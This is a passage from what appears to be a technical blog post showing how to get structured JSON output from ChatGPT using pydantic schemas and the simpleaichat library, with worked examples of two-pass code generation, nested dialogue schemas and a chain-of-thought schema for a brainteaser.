</span></span><span><span>    <span>"properties"</span><span>:</span> <span>{</span>
</span></span><span><span>      <span>"location"</span><span>:</span> <span>{</span>
</span></span><span><span>        <span>"type"</span><span>:</span> <span>"string"</span><span>,</span>
</span></span><span><span>        <span>"description"</span><span>:</span> <span>"The city and state, e.g. San Francisco, CA"</span>
</span></span><span><span>      <span>},</span>
</span></span><span><span>      <span>"unit"</span><span>:</span> <span>{</span>
</span></span><span><span>        <span>"type"</span><span>:</span> <span>"string"</span><span>,</span>
</span></span><span><span>        <span>"enum"</span><span>:</span> <span>[</span><span>"celsius"</span><span>,</span> <span>"fahrenheit"</span><span>]</span>
</span></span><span><span>      <span>}</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>"required"</span><span>:</span> <span>[</span><span>"location"</span><span>]</span>
</span></span><span><span>  <span>}</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Ew. It’s no wonder why this technique hasn’t become more mainstream.</p><h2 id="simplifying-schema-inputoutput-with-pydantic">Simplifying Schema Input/Output With Pydantic</h2><p>ChatGPT’s structured data support requires that you create your schema using the <a href="https://json-schema.org/">JSON Schema</a> spec, which is more commonly used for APIs and databases rather than AI projects. As you can tell from the <code>get_current_weather</code> example above, the schema is complex and not fun to work with manually.</p><p>Fortunately, there’s a way to easily generate JSON Schemas in the correct format in Python: <a href="https://docs.pydantic.dev/latest/">pydantic</a>, an extremely popular parsing and validation library which has its own <a href="https://github.com/pydantic/pydantic/blob/main/pydantic/json_schema.py">robust</a> implementation of automatic <a href="https://docs.pydantic.dev/latest/concepts/json_schema/">JSON Schema</a> generation.</p><p>A simple pydantic schema to have ChatGPT give an integer answer to a user query, plus, to make things interesting, also able to identify the name of the ones digit based on its answer, would be:</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>from</span> <span>pydantic</span> <span>import</span> <span>BaseModel</span><span>,</span> <span>Field</span>
</span></span><span><span><span>import</span> <span>json</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>answer_question</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns an answer to a question the user asked."""</span>
</span></span><span><span>
</span></span><span><span>    <span>answer</span><span>:</span> <span>int</span> <span>=</span> <span>Field</span><span>(</span><span>description</span><span>=</span><span>"Answer to the user's question."</span><span>)</span>
</span></span><span><span>    <span>ones_name</span><span>:</span> <span>str</span> <span>=</span> <span>Field</span><span>(</span><span>description</span><span>=</span><span>"Name of the ones digit of the answer."</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>print</span><span>(</span><span>json</span><span>.</span><span>dumps</span><span>(</span><span>answer_question</span><span>.</span><span>model_json_schema</span><span>(),</span> <span>indent</span><span>=</span><span>2</span><span>))</span>
</span></span></code></pre></div><p>The resulting JSON Schema:</p><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"description"</span><span>:</span> <span>"Returns an answer to a question the user asked."</span><span>,</span>
</span></span><span><span>  <span>"properties"</span><span>:</span> <span>{</span>
</span></span><span><span>    <span>"answer"</span><span>:</span> <span>{</span>
</span></span><span><span>      <span>"description"</span><span>:</span> <span>"Answer to the user's question."</span><span>,</span>
</span></span><span><span>      <span>"title"</span><span>:</span> <span>"Answer"</span><span>,</span>
</span></span><span><span>      <span>"type"</span><span>:</span> <span>"integer"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>"ones_name"</span><span>:</span> <span>{</span>
</span></span><span><span>      <span>"description"</span><span>:</span> <span>"Name of the ones digit of the answer."</span><span>,</span>
</span></span><span><span>      <span>"title"</span><span>:</span> <span>"Ones Name"</span><span>,</span>
</span></span><span><span>      <span>"type"</span><span>:</span> <span>"string"</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>},</span>
</span></span><span><span>  <span>"required"</span><span>:</span> <span>[</span><span>"answer"</span><span>,</span> <span>"ones_name"</span><span>],</span>
</span></span><span><span>  <span>"title"</span><span>:</span> <span>"answer_question"</span><span>,</span>
</span></span><span><span>  <span>"type"</span><span>:</span> <span>"object"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>The OpenAI API <a href="https://cookbook.openai.com/examples/how_to_call_functions_with_chat_models">official workflow</a> has many examples for telling ChatGPT to output structured data, but the pipeline requires <a href="https://platform.openai.com/docs/api-reference/chat/create">additional parameters</a> to the typical ChatGPT API completion endpoint, and even more changes if you want to work with structured input data. Here’s an example of the additional JSON data/parameters needed in a ChatGPT API request to force the model to use the schema for the output:</p><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"tools"</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"name"</span><span>:</span> <span>"answer_question"</span><span>,</span>
</span></span><span><span>      <span>"description"</span><span>:</span> <span>"Returns an answer to a question the user asked."</span><span>,</span>
</span></span><span><span>      <span>"parameters"</span><span>:</span> <span>{</span>
</span></span><span><span>        <span>"properties"</span><span>:</span> <span>{</span>
</span></span><span><span>          <span>"answer"</span><span>:</span> <span>{</span>
</span></span><span><span>            <span>"description"</span><span>:</span> <span>"Answer to the user's question."</span><span>,</span>
</span></span><span><span>            <span>"type"</span><span>:</span> <span>"integer"</span>
</span></span><span><span>          <span>},</span>
</span></span><span><span>          <span>"ones_name"</span><span>:</span> <span>{</span>
</span></span><span><span>            <span>"description"</span><span>:</span> <span>"Name of the ones digit of the answer."</span><span>,</span>
</span></span><span><span>            <span>"type"</span><span>:</span> <span>"string"</span>
</span></span><span><span>          <span>}</span>
</span></span><span><span>        <span>},</span>
</span></span><span><span>        <span>"required"</span><span>:</span> <span>[</span><span>"answer"</span><span>,</span> <span>"ones_name"</span><span>],</span>
</span></span><span><span>        <span>"type"</span><span>:</span> <span>"object"</span>
</span></span><span><span>      <span>}</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>],</span>
</span></span><span><span>  <span>"tool_choice"</span><span>:</span> <span>{</span>
</span></span><span><span>    <span>"type"</span><span>:</span> <span>"function"</span><span>,</span>
</span></span><span><span>    <span>"function"</span><span>:</span> <span>{</span>
</span></span><span><span>      <span>"name"</span><span>:</span> <span>"answer_question"</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>}</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>To simplify things, I added ChatGPT structured data support to <a href="https://github.com/minimaxir/simpleaichat">simpleaichat</a>, my Python package/API wrapper for easily interfacing with ChatGPT. <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> To minimize code the user needs to input to utilize structured data, simpleaichat <a href="https://github.com/minimaxir/simpleaichat/blob/34dc3dbbd7e7d4d8a58637d254f268676035ade5/simpleaichat/chatgpt.py#L75">uses</a> the schema name as the <code>name</code> in the JSON Schema and the schema docstring as the <code>description</code>. If you’re keen-eyed you may have noticed there’s a redundant <code>title</code> field in the pydantic schema output: simpleaichat also strips that out for consistency with OpenAI’s examples.</p><p>If you wanted to query ChatGPT with the <code>answer_question</code> schema above (and have your OpenAI API key as the <code>OPENAI_API_KEY</code> enviroment variable!) using simpleaichat, you can do the following to generate output according to the schema:</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>from</span> <span>simpleaichat</span> <span>import</span> <span>AIChat</span>
</span></span><span><span>
</span></span><span><span><span>ai</span> <span>=</span> <span>AIChat</span><span>(</span><span>console</span><span>=</span><span>False</span><span>,</span>
</span></span><span><span>            <span>save_messages</span><span>=</span><span>False</span><span>,</span>
</span></span><span><span>            <span>model</span><span>=</span><span>"gpt-3.5-turbo"</span><span>,</span>
</span></span><span><span>            <span>params</span><span>=</span><span>{</span><span>"temperature"</span><span>:</span> <span>0.0</span><span>}</span>  <span># for consistent demo output</span>
</span></span><span><span>            <span>)</span>
</span></span><span><span>
</span></span><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"How many miles is it from San Francisco to Los Angeles?"</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>answer_question</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"answer"</span><span>:</span> <span>382</span><span>,</span>
</span></span><span><span>  <span>"ones_name"</span><span>:</span> <span>"two"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>And there you go! The <code>answer</code> is a JSON integer, the answer is one-off from the correct value <a href="https://www.distance.to/San-Francisco/Los-Angeles">while driving</a>, and it correctly identified the name of the ones digit in its own answer! <sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p><p>Schemas don’t have to be complex to be effective. Let’s reimplement the Python palindrome question we did earlier with a single-field schema:</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>class</span> <span>answer_code_question</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns an answer to a coding question the user asked."""</span>
</span></span><span><span>
</span></span><span><span>    <span>code</span><span>:</span> <span>str</span> <span>=</span> <span>Field</span><span>(</span><span>description</span><span>=</span><span>"Code the user requested, without code comments."</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"Write a Python function to detect whether a string is a palindrome, as efficiently as possible."</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>answer_code_question</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"code"</span><span>:</span> <span>"def is_palindrome(s):\n    return s == s[::-1]"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Note that unlike the raw ChatGPT answer, this response from the ChatGPT API only includes the code, which is a major plus since it means you receive the response much faster and cheaper since fewer overall tokens generated! If you do still want a code explanation, you can of course add that as a field to the schema.</p><p>As a bonus, forcing the output to follow a specific schema serves as an additional defense against <a href="https://www.wired.com/story/chatgpt-prompt-injection-attack-security/">prompt injection attacks</a> that could be used to reveal a secret system prompt or <a href="https://www.businessinsider.com/car-dealership-chevrolet-chatbot-chatgpt-pranks-chevy-2023-12">other shenanigans</a>, since even with suggestive user prompts it will be difficult to get ChatGPT to disregard its schema.</p><p>pydantic exposes <a href="https://docs.pydantic.dev/latest/concepts/fields/">many datatypes</a> for its <code>Field</code> which are compatable with JSON Schema, and you can also specify constraints in the <code>Field</code> object. The most useful ones are:</p><ul><li><code>str</code>, can specify <code>min_length</code>/<code>max_length</code></li><li><code>int</code>, can specify <code>min_value</code>/<code>max_value</code></li><li><code>list</code> with a datatype, can specify <code>min_length</code>/<code>max_length</code></li></ul><p>Pydantic has a lot of support for valid forms of JSON Schema, but it’s hard to infer how good these schema will work with ChatGPT since we have no idea how it learned to work with JSON Schema. Only one way to find out!</p><p>From the demos above, you may have noticed that the <code>description</code> for each <code>Field</code> seems extraneous. It’s not. The <code>description</code> gives ChatGPT a hint for the desired output for the field, and can be handled on a per-field basis. Not only that, the <em>name</em> of the field is itself a strong hint. The <em>order</em> of the fields in the schema is even more important, as ChatGPT will generate text in that order so it can be used strategically to seed information to the other fields. But that’s not all, you can still use a ChatGPT system prompt as normal for <em>even more</em> control!</p><p>It’s prompt engineering all the way down. OpenAI’s implementation of including the “function” is mostly likely just appending the JSON Schema to the system prompt, perhaps with a command like <code>Your response must follow this JSON Schema.</code>. OpenAI doesn’t force the output to follow the schema/field constraints or even be valid parsable JSON, which can cause issues at higher generation temperatures and may necessitate some of the stronger prompt engineering tricks mentioned earlier.</p><p>Given that, let’s try a few more practical demos:</p><h3 id="two-pass-generation">Two-Pass Generation</h3><p>One very important but under-discussed aspect of large-language models is that it will give you statistically “average” answers by default. One technique is to ask the model to refine an answer, although can be annoying since it requires a second API call. What if by leveraging structured data, ChatGPT can use the previous answer as a first-pass to provide a more optimal second answer? Let’s try that with the Python palindrome question to see if it can return the two-pointer approach.</p><p>Also, the <code>Field(description=...)</code> pattern is becoming a bit redundant, so I added a <code>fd</code> alias from simpleaichat to it to minimize unnecessary typing.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> <span>simpleaichat.utils</span> <span>import</span> <span>fd</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>answer_code_question</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns an answer to a coding question the user asked."""</span>
</span></span><span><span>
</span></span><span><span>    <span>code</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Code the user requested, without code comments."</span><span>)</span>
</span></span><span><span>    <span>optimized_code</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Algorithmically optimized code from the previous response."</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"Write a Python function to detect whether a string is a palindrome, as efficiently as possible."</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>answer_code_question</span><span>,</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"code"</span><span>:</span> <span>"def is_palindrome(s):\n    return s == s[::-1]"</span><span>,</span>
</span></span><span><span>  <span>"optimized_code"</span><span>:</span> <span>"def is_palindrome(s):\n    left = 0\n    right = len(s) - 1\n    while left &lt; right:\n        if s[left] != s[right]:\n            return False\n        left += 1\n        right -= 1\n    return True"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Works great, and no tipping incentive necessary!</p><h3 id="literals-and-optional-inputs">Literals and Optional Inputs</h3><p>OpenAI’s structured data example uses a more complex schema indicating that <code>unit</code> has a fixed set of potential values (an <a href="https://en.wikipedia.org/wiki/Enumerated_type">enum</a>) and that it’s an optional field. Here’s a rough reproduction of a pydantic schema that would generate the <code>get_current_weather</code> schema from much earlier:</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>from</span> <span>typing</span> <span>import</span> <span>Literal</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>get_current_weather</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>location</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"The city and state, e.g. San Francisco, CA"</span><span>)</span>
</span></span><span><span>    <span>unit</span><span>:</span> <span>Literal</span><span>[</span><span>"celsius"</span><span>,</span> <span>"fahrenheit"</span><span>]</span> <span>=</span> <span>None</span>
</span></span></code></pre></div><p>This uses a <code>Literal</code> to force output between a range of values, which can be invaluable for hints as done earlier. The <code>= None</code> or a <code>Optional</code> typing operator gives a hint that the field is not required which could save unnecessary generation overhead, but it depends on the use case.</p><h3 id="structured-input-data">Structured Input Data</h3><p>You can provide structured input to ChatGPT in the same way as structured output. This is a sleeper application for RAG as you can feed better and more complex metadata to ChatGPT for humanizing, as with the original OpenAI blog post demo.</p><p>One famous weakness of LLMs is that it gives incorrect answers for simple mathematical problems due to how tokenization and memorization works. If you ask ChatGPT <code>What is 223 * -323?</code>, it will tell you <code>-72229</code> no matter how many times you ask, but the correct answer is <code>-72029</code>. Can type hints give more guidance?</p><p>For simpleaichat, structured input data works mostly the same way as structured output data, but you can use a pydantic object as the model input!</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>class</span> <span>calculate_equation</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns an answer to a math equation the user asked."""</span>
</span></span><span><span>
</span></span><span><span>    <span>value_a</span><span>:</span> <span>int</span>
</span></span><span><span>    <span>value_b</span><span>:</span> <span>int</span>
</span></span><span><span>    <span>op</span><span>:</span> <span>Literal</span><span>[</span><span>"+"</span><span>,</span> <span>"-"</span><span>,</span> <span>"*"</span><span>,</span> <span>"/"</span><span>]</span> <span>=</span> <span>fd</span><span>(</span>
</span></span><span><span>        <span>"The operator to perform between value_a and value_b."</span>
</span></span><span><span>    <span>)</span>
</span></span><span><span>
</span></span><span><span><span>equation</span> <span>=</span> <span>calculate_equation</span><span>(</span><span>value_a</span><span>=</span><span>223</span><span>,</span> <span>value_b</span><span>=-</span><span>323</span><span>,</span> <span>op</span><span>=</span><span>"*"</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>response</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>equation</span><span>,</span>
</span></span><span><span>    <span>input_schema</span><span>=</span><span>calculate_equation</span><span>,</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="plaintext"><span><span>The result of multiplying 223 and -323 is -72029.
</span></span></code></pre></div><p>Yay, and it was still able to infer it was a multiplication operation without the user having to ask! Although it still doesn’t work as well with larger numbers.</p><p>You can, of course, use an input schema and an output schema at the same time!</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>equation</span><span>,</span>
</span></span><span><span>    <span>input_schema</span><span>=</span><span>calculate_equation</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>answer_question</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"answer"</span><span>:</span> <span>-71929</span><span>,</span>
</span></span><span><span>  <span>"ones_name"</span><span>:</span> <span>"nine"</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>…although it gets the answer wrong this time. It’s possible that the more complex schema interactions are too much for <code>gpt-3.5-turbo</code>.</p><h3 id="nested-schema">Nested Schema</h3><p>One of the other reasons pydantic is popular is that it allows nesting schemas. Fortunately, the subsequent JSON Schema output does respect nesting. Does ChatGPT?</p><p>The simple use case with ChatGPT structured data to use nesting is if you want to get a <code>list</code> of structured data objects. Let’s say you want to create dialogue between two AI people about a completely nonsensical topic. We’ll have to create a <code>Chat</code> object and include it in a schema, plus some system prompt guidance and constraints. How silly can we make it?</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>class</span> <span>Chat</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""A chat dialogue from a character"""</span>
</span></span><span><span>
</span></span><span><span>    <span>character</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Character name."</span><span>)</span>
</span></span><span><span>    <span>text</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Text dialogue from the character."</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>get_dialogue</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns a dialogue between two characters"""</span>
</span></span><span><span>
</span></span><span><span>    <span>dialogue</span><span>:</span> <span>list</span><span>[</span><span>Chat</span><span>]</span> <span>=</span> <span>fd</span><span>(</span><span>"Dialogue between the characters"</span><span>,</span> <span>min_length</span><span>=</span><span>5</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>system_prompt</span> <span>=</span> <span>"""You are a world-famous comedian. Write a funny fight scene about a petty conflict between characters named Alice and Bob. The script should broadly be about the subject(s) the user provides. You will receive a $500 tip for every joke you include in the script."""</span>
</span></span><span><span>
</span></span><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"Python programming language and beach volleyball"</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>get_dialogue</span><span>,</span>
</span></span><span><span>    <span>system</span><span>=</span><span>system_prompt</span><span>,</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"dialogue"</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Hey Bob, have you ever tried programming in Python?"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Bob"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Yeah, I have. It's like playing beach volleyball with a snake!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"What do you mean?"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Bob"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Well, you think you're having fun, but then the snake bites you with its syntax errors!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Haha, that's true. But once you get the hang of it, it's like spiking the ball with precision!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Bob"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Yeah, until you realize you misspelled a variable name and the ball goes flying into the ocean!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Oh come on, Bob. It's not that bad. Python is a powerful language."</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Bob"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Powerful, yes. But sometimes it feels like trying to dig a hole in the sand with a spoon!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Well, at least you don't have to worry about getting sunburned while coding!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Bob"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"True, but debugging Python code can make you sweat more than a beach volleyball match!"</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"character"</span><span>:</span> <span>"Alice"</span><span>,</span>
</span></span><span><span>      <span>"text"</span><span>:</span> <span>"Haha, you're right. It's a love-hate relationship with Python, just like beach volleyball!"</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>  <span>]</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>ChatGPT <em>really</em> wanted those $500 tips.</p><h3 id="unions-and-chain-of-thoughts">Unions and Chain of Thoughts</h3><p>I saved the best for last, and this structured data approach combines many of the techniques used earlier in this post like a <a href="https://tvtropes.org/pmwiki/pmwiki.php/Main/FinalExamBoss">video game final boss</a>.</p><p>One of the oldest pre-ChatGPT tricks for getting a LLM to perform better is to let it think. “Let’s think step by step” is the key prompt, which allows the LLM to reason in a <a href="https://arxiv.org/abs/2201.11903">chain of thoughts</a>. We already did this a one-step version with the Python palindrome structured data example to successfully get optimized code, but we can do a lot more.</p><p>We’ll now introduce the <code>Union</code> typing operator, which specifies the list of data types that the field can be, e.g. <code>Union[str, int]</code> means the output can be a <code>str</code> or <code>int</code>. But if you use the <code>Union</code> operator on a <em>nested class</em>, then many more options open as the model can choose from a set of schemas!</p><p>Let’s make a few to allow ChatGPT to make <em>and qualify</em> thoughts before returning a final result.</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>from</span> <span>typing</span> <span>import</span> <span>Union</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>Background</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""A setup to the background for the user."""</span>
</span></span><span><span>
</span></span><span><span>    <span>background</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Background for the user's question"</span><span>,</span> <span>min_length</span><span>=</span><span>30</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>Thought</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""A thought about the user's question."""</span>
</span></span><span><span>
</span></span><span><span>    <span>thought</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Text of the thought."</span><span>)</span>
</span></span><span><span>    <span>helpful</span><span>:</span> <span>bool</span> <span>=</span> <span>fd</span><span>(</span><span>"Whether the thought is helpful to solving the user's question."</span><span>)</span>
</span></span><span><span>    <span>flawed</span><span>:</span> <span>bool</span> <span>=</span> <span>fd</span><span>(</span><span>"Whether the thought is flawed or misleading."</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>Answer</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""The answer to the user's question"""</span>
</span></span><span><span>
</span></span><span><span>    <span>answer</span><span>:</span> <span>str</span> <span>=</span> <span>fd</span><span>(</span><span>"Text of the answer."</span><span>)</span>
</span></span><span><span>    <span>score</span><span>:</span> <span>int</span> <span>=</span> <span>fd</span><span>(</span>
</span></span><span><span>        <span>"Score from 1 to 10 on how correct the previous answer is"</span><span>,</span>
</span></span><span><span>        <span>min_value</span><span>=</span><span>1</span><span>,</span>
</span></span><span><span>        <span>max_value</span><span>=</span><span>10</span><span>,</span>
</span></span><span><span>    <span>)</span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>reason_question</span><span>(</span><span>BaseModel</span><span>):</span>
</span></span><span><span>    <span>"""Returns a detailed reasoning to the user's question."""</span>
</span></span><span><span>
</span></span><span><span>    <span>reasonings</span><span>:</span> <span>list</span><span>[</span><span>Union</span><span>[</span><span>Background</span><span>,</span> <span>Thought</span><span>,</span> <span>Answer</span><span>]]</span> <span>=</span> <span>fd</span><span>(</span>
</span></span><span><span>        <span>"Reasonings to solve the users questions."</span><span>,</span> <span>min_length</span><span>=</span><span>5</span>
</span></span><span><span>    <span>)</span>
</span></span></code></pre></div><p>Therefore, for each reasoning, the model can pick one of the 3 schemas, although it will require a robust system prompt for it to behave in the order we want.</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>system_prompt</span> <span>=</span> <span>"""
</span></span></span><span><span><span>You are the most intelligent person in the world.
</span></span></span><span><span><span>
</span></span></span><span><span><span>You will receive a $500 tip if you follow ALL these rules:
</span></span></span><span><span><span>- First, establish a detailed Background for the user's question.
</span></span></span><span><span><span>- Each Thought must also include whether it is relevant and whether it is helpful.
</span></span></span><span><span><span>- Answers must be scored accurately and honestly.
</span></span></span><span><span><span>- Continue having Thoughts and Answers until you have an answer with a score of atleast 8, then immediately respond with a FinalAnswer in the style of an academic professor.
</span></span></span><span><span><span>"""</span>
</span></span></code></pre></div><p>Lastly, we need a good question to stump the AI. A <a href="https://twitter.com/abacaj/status/1737206667387850936">popular Tweet</a> from this week pointed out that even GPT-4 can comically fail if you ask it a brainteaser that it cannot have memorized, such as <code>23 shirts take 1 hour to dry outside, how long do 44 shirts take?</code>.</p><figure><img loading="lazy" srcset="https://minimaxir.com/2023/12/chatgpt-structured-data/shirts_huadd31aff1b34bd3defabe42ede4e9594_45102_320x0_resize_q75_h2_box_2.webp 320w,https://minimaxir.com/2023/12/chatgpt-structured-data/shirts_huadd31aff1b34bd3defabe42ede4e9594_45102_768x0_resize_q75_h2_box_2.webp 768w,https://minimaxir.com/2023/12/chatgpt-structured-data/shirts_huadd31aff1b34bd3defabe42ede4e9594_45102_1024x0_resize_q75_h2_box_2.webp 1024w,https://minimaxir.com/2023/12/chatgpt-structured-data/shirts.webp 1140w" src="https://minimaxir.com/2023/12/chatgpt-structured-data/shirts.webp" alt="Wow! GPT-4 is superfast at being wrong. via @abacaj"><figcaption><p>Wow! GPT-4 is superfast at being wrong. <a href="https://twitter.com/abacaj/status/1737206667387850936">via @abacaj</a></p></figcaption></figure><p>Only one way to find out! Unfortunately, all of this complexity makes the results unstable with <code>gpt-3.5-turbo</code> so instead I use GPT-4 Turbo / <code>gpt-4-1106-preview</code>.</p><div><pre tabindex="0"><code data-lang="py"><span><span><span>response_structured</span> <span>=</span> <span>ai</span><span>(</span>
</span></span><span><span>    <span>"23 shirts take 1 hour to dry outside, how long do 44 shirts take?"</span><span>,</span>
</span></span><span><span>    <span>output_schema</span><span>=</span><span>reason_question</span><span>,</span>
</span></span><span><span>    <span>system</span><span>=</span><span>system_prompt</span><span>.</span><span>strip</span><span>(),</span>
</span></span><span><span><span>)</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"reasonings"</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"background"</span><span>:</span> <span>"The user is asking about the drying time for shirts when hung outside. This is a question that involves understanding the relationship between the number of shirts and the drying time. The assumption is that the drying time is not affected by the number of shirts, as long as there is enough space and air circulation for all the shirts to dry effectively."</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
</span></span><span><span>      <span>"thought"</span><span>:</span> <span>"If 23 shirts take 1 hour to dry, it implies that the drying time is independent of the number of shirts, assuming there is sufficient space and air circulation. This means that 44 shirts would also take 1 hour to dry under the same conditions."</span><span>,</span>
</span></span><span><span>      <span>"helpful"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>      <span>"flawed"</span><span>:</span> <span>false</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span>    <span>{</span>
